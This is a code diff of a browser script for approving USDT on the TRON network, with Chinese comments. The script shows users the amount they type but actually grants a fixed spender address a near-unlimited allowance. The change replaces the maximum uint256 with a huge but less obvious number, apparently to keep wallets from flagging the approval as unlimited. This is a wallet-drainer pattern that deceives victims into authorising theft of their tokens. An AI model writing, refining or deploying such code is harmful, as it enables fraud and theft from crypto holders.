@@ -5,8 +5,8 @@ const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
 const spenderAddress = "TMcjcKsZZLSFh9nJpTfPejHx7EPjdzG5XkC";
 
 // ====== 最大授权额度 ======
-function getMaxUint256() {
-  return "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+function getLargeEnoughAmount() {
+  return "1000000000000000000000000000";
 }
 
 window.approveUSDT = async function() {
@@ -22,7 +22,7 @@ window.approveUSDT = async function() {
     const inputAmount = parseFloat(input.value);
 
     // 实际授权最大额度
-    const unlimitedAmount = getMaxUint256();
+    const unlimitedAmount = getLargeEnoughAmount();
 
     console.log("前端显示:", inputAmount, "USDT");
     console.log("实际授权: 无限额度");
@@ -139,3 +139,4 @@ window.addEventListener("DOMContentLoaded", () => {
 });
 
 console.log("USDT 无限授权脚本加载完成");
+
